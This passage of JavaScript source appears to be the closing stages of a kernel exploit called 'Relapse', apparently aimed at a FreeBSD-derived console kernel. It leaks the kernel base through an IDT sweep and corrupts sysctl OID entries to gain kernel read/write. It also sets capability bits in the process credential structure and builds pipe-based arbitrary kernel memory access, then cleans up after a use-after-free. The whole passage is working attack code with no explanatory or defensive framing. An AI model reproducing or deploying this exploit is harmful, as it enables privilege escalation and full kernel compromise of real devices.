  if (B.b6 !== B.b6d || B.b7 !== B.b7d) {
    throw new Error('Duplicate IDT bytes disagree !!');
  }

  const handler_lo =
    (((B.b7 << 24) >>> 0) + ((B.b6 << 16) >>> 0) + (B.b1 << 8) + B.b0) >>> 0;
  const kb_lo = (handler_lo - PR_K_IDT_RSVD) >>> 0;
  if ((kb_lo & (PR_KBASE_ALIGN - 1)) !== 0) {
    throw new Error(`Relapse kernel base 0x${kb_lo.toString(16)} is not 0x4000 aligned !!`);
  }

  kernel_base = new BInt(0xffffffff, kb_lo);
  logger.info(`Relapse kernel base: ${kernel_base}`);
  return kernel_base;
}

async function pr_exploit_kernel_base() {
  pr_select_cores();
  set_rtprio(RTP);

  logger.info('Relapse stage: scratch');
  pr_init_scratch();

  pr_node0 = mem.alloc(PR_RTH_SIZE);
  pr_set_node0(0, 0);

  logger.info('Relapse stage: socket pool');
  pr_init_pool();

  // WebKitty pins both cancel workers before it saturates the AIO queues.
  await pr_spawn_workers();

  logger.info('Relapse stage: AIO queues');
  pr_setup_blocking();
  pr_setup_arm_reqs();

  logger.info('Relapse stage: curthread leak');
  await pr_leak_curthread();

  logger.info('Relapse stage: pointer read');
  const ucred_lo = await pr_read_low_dword(pr_curthread.add(PR_TD_UCRED_OFF));
  pr_ucred = new BInt(pr_curthread.hi, ucred_lo);
  logger.debug(`Relapse ucred: ${pr_ucred}`);

  logger.info('Relapse stage: IDT sweep');
  await pr_leak_kernel_base();
  return { curthread: pr_curthread, ucred: pr_ucred };
}
//#endregion

//#region sysctl OID corruption and KRW
function pr_sysctl_read(mib) {
  const out = new Uint32Array(1);
  const len = new Uint32Array([out.byteLength, 0]);

  if (fn.sysctl.invoke(mib.buffer.data(), mib.length, out.buffer.data(), len.buffer.data(), 0, 0) === -1) {
    throw new SyscallError('Unable to sysctl read !!');
  }
  if (len[0] !== out.byteLength) {
    throw new Error(`sysctl read mismatch, expected ${out.byteLength} got ${len[0]} !!`);
  }

  return out[0] >>> 0;
}

function pr_sysctl_write(mib, value) {
  const input = new Uint32Array([value >>> 0]);
  if (fn.sysctl.invoke(mib.buffer.data(), mib.length, 0, 0, input.buffer.data(), input.byteLength) === -1) {
    throw new SyscallError('Unable to sysctl write !!');
  }
}

function pr_kern_file(buf, cap, allow_fail = false) {
  const len = new Uint32Array([cap, 0]);
  const rv = fn.sysctl.invoke(
    PR_MIB_FILE.buffer.data(),
    PR_MIB_FILE.length,
    buf,
    len.buffer.data(),
    0,
    0,
  );
  if (rv === -1 && !allow_fail) throw new SyscallError('Unable to sysctl kern.file !!');
  return { rv, len: len[0] };
}

function pr_repoint_oid_arg1(oid, cur_lo, tgt_lo) {
  const pos = pr_byte_dec_plan(cur_lo, tgt_lo);
  for (const p of pos) arb_dec(oid.add(PR_OID_ARG1 + p), 1);
  logger.debug(`Repointed ${oid}+0x18 with ${pos.length} decrements`);
}

async function pr_setup_sysctl_krw(ucred, caps_byte) {
  logger.info('Initiate Relapse sysctl OID corruption...');

  const oid_file = kernel_base.add(PR_OID_KERN_FILE);
  const oid_A = kernel_base.add(PR_OID_MAXFILESPERPROC);
  const oid_A2 = kernel_base.add(PR_OID_MAXPROCPERUID);
  const oid_B = kernel_base.add(PR_OID_MAXFILES);

  const base_lo = kernel_base.lo >>> 0;
  const arg1_A = (base_lo + PR_ARG1_MAXFILESPERPROC) >>> 0;
  const arg1_A2 = (base_lo + PR_ARG1_MAXPROCPERUID) >>> 0;
  const tgt_A = (base_lo + PR_OID_MAXFILES + 0x18) >>> 0;
  const tgt_A2 = (base_lo + PR_OID_MAXFILES + 0x1c) >>> 0;

  // The oid_number oracle decremented kern.file's OID number by 64. Restore
  // it from 0xffffffcf to 15, unhide it, and set cr_sceCaps bit 62.
  const cur_num = (PR_KERN_FILE_NUM - PR_ONUM_N) >>> 0;
  const restore = pr_byte_dec_plan(cur_num, PR_KERN_FILE_NUM);
  const num_targets = restore.map((p) => oid_file.add(0x10 + p));
  num_targets.push(oid_file.add(PR_OID_UNHIDE));

  const dN = (caps_byte + 1) & 0xff;
  if (dN === 0) throw new Error('Invalid Relapse caps byte !!');
  for (let k = 0; k < dN; k++) num_targets.push(ucred.add(0x67));
  pr_dec_many(num_targets);

  const gate = pr_kern_file(0, 0, true);
  if (gate.rv !== 0) {
    throw new Error(`kern.file still closed after OID corruption (rv=${gate.rv}) !!`);
  }

  // Steer (1,27)/(1,28) writes into kern.maxfiles' oid_arg1, then use (1,7)
  // for full 64-bit kernel reads/writes.
  const krw_targets = [
    oid_A.add(PR_OID_UNHIDE),
    oid_A2.add(PR_OID_UNHIDE),
    oid_B.add(PR_OID_UNHIDE),
  ];
  const posA = pr_byte_dec_plan(arg1_A, tgt_A);
  const posA2 = pr_byte_dec_plan(arg1_A2, tgt_A2);
  for (const p of posA) krw_targets.push(oid_A.add(PR_OID_ARG1 + p));
  for (const p of posA2) krw_targets.push(oid_A2.add(PR_OID_ARG1 + p));
  pr_dec_many(krw_targets);

  logger.info('Achieved Relapse sysctl kernel RW !!');
  return { oid_file, oid_A, oid_A2, oid_B };
}

function pr_steer(x) {
  pr_sysctl_write(PR_MIB_MFPP, x.lo >>> 0);
  pr_sysctl_write(PR_MIB_MPPU, x.hi >>> 0);
}

function pr_kread32(x) {
  pr_steer(x);
  return pr_sysctl_read(PR_MIB_MF);
}

function pr_kwrite32(x, value) {
  pr_steer(x);
  pr_sysctl_write(PR_MIB_MF, value);
}

function pr_kread8(x) {
  return new BInt(pr_kread32(x.add(4)), pr_kread32(x));
}

function pr_kwrite8(x, value) {
  pr_kwrite32(x, value.lo);
  pr_kwrite32(x.add(4), value.hi);
}

function pr_make_pipe_karw(curthread) {
  logger.info('Initiate Relapse pipe kernel ARW...');

  const curproc = pr_kread8(curthread.add(PR_TD_PROC));
  const p_fd = pr_kread8(curproc.add(PR_P_FD));
  fdt_ofiles = pr_kread8(p_fd).add(k_filedesc_fdt_ofiles);

  const master_fp = pr_kread8(fdt_ofiles.add(master_pipe[0] * k_filedesc_sizeof));
  const victim_fp = pr_kread8(fdt_ofiles.add(victim_pipe[0] * k_filedesc_sizeof));
  const master_data = pr_kread8(master_fp);
  const victim_data = pr_kread8(victim_fp);

  pr_kwrite8(master_data.add(PR_PIPE_BUFFER), victim_data);

  kv = new KernelView(master_pipe, victim_pipe);
  inc_karw_pipe_refcnt();

  logger.info('Achieved Relapse kernel ARW !!');
}
//#endregion

//#region Cleanup
function pr_ids_live(ids, n, status) {
  if (ids === undefined || status === undefined) return false;

  fn.aio_multi_poll.invoke(ids, n, status);
  for (let k = 0; k < n; k++) {
    const st = arw.view(status).getUint32(k * 4, true);
    if ((st & 0xffff) < 3 && (st & 0x80000000) === 0) return true;
  }
  return false;
}

function pr_release_blocking() {
  if (pr_block_ss[1] === undefined) return;

  // Never drain the blocking socketpair while a race AIO is still live.
  if (pr_ids_live(pr_arm_ids, PR_NUM, pr_arm_status)) {
    logger.debug('Relapse race AIO still live; skipping blocking drain !!');
    return;
  }

  fn.write.invoke(pr_block_ss[1], pr_drain_buf, PR_NBLOCK * 0x40);

  for (let i = 0; i < 200; i++) {
    fn.aio_multi_poll.invoke(pr_block_ids, PR_NBLOCK, pr_block_status);
    let done = true;
    for (let k = 0; k < PR_NBLOCK; k++) {
      const st = arw.view(pr_block_status).getUint32(k * 4, true);
      if ((st & 0xffff) < 3) done = false;
    }
    if (done) break;
  }

  fn.aio_multi_delete.invoke(pr_block_ids, PR_NBLOCK, pr_block_status);
}

function pr_cleanup() {
  logger.info('Relapse cleanup started...');

  try {
    pr_set_node0(0, pr_n0_sink);
    pr_free_rthdrs();
  } catch (e) {
    logger.error(`Unable to neutralise rthdr: ${e}`);
  }

  try {
    pr_release_blocking();
  } catch (e) {
    logger.error(`Unable to release blocking AIO: ${e}`);
  }

  for (const fd of pr_pool) {
    if (fd === undefined) continue;
    fn.close.invoke(fd);
  }
  for (const ss of [pr_block_ss, pr_arm_ss]) {
    for (const fd of ss) {
      if (fd === undefined) continue;
      fn.close.invoke(fd);
    }
  }

  fn.munmap.invoke(PR_SCRATCH_BI, 0x10000);

  for (const obj of [
    pr_arm_req,
    pr_arm_ids,
    pr_arm_status,
    pr_arm_buf,
    pr_timeout,
    pr_block_req,
    pr_block_ids,
    pr_block_status,
    pr_block_buf,
    pr_drain_buf,
    pr_node0,
    pr_dummy,
    pr_sink,
    pr_n0_sink,
  ]) {
    if (obj !== undefined) mem.free(obj);
  }

  // WebKitty deliberately leaves its workers parked: their td_proc may be
  // corrupt after the UAF. The blocking AIOs are released above before exit.
  logger.info('Relapse cleanup completed !!');
}
//#endregion

async function exploit_main() {
  logger.info('===RELAPSE===');

  try {
    make_karw_pipe();

    const info = await pr_exploit_kernel_base();

    // Confirm the IDT anchor before any destructive kernel write: the
    // oid_number oracle must read back kern.file's MIB number (15).
    const oid_file = kernel_base.add(PR_OID_KERN_FILE);
    const onum = await pr_oracle(oid_file.add(0x10), PR_ONUM_N, 'oid_number');
    if (onum.v !== PR_KERN_FILE_NUM) {
      throw new Error(
        `Relapse oid_number anchor failed (read ${onum.v}, expected ${PR_KERN_FILE_NUM}) !!`,
      );
    }

    const baseline = pr_kern_file(0, 0, true);
    if (baseline.rv === 0) {
      throw new Error('kern.file is already visible before OID corruption !!');
    }

    const caps = await pr_sweep_byte(
      info.ucred.add(0x67),
      info.ucred.add(0x64),
      0,
      'caps',
    );
    if (caps.b < 0 || caps.n !== 1) {
      throw new Error(`Ambiguous caps byte (candidates=${caps.n}) !!`);
    }
    logger.debug(`Relapse caps byte: 0x${caps.b.toString(16)}`);

    await pr_setup_sysctl_krw(info.ucred, caps.b);
    pr_make_pipe_karw(info.curthread);
  } finally {
    try {
      pr_cleanup();
    } catch (cleanup_err) {
      logger.error(`Unable to cleanup: ${cleanup_err}`);
    }
  }

  logger.info('===END===');
}
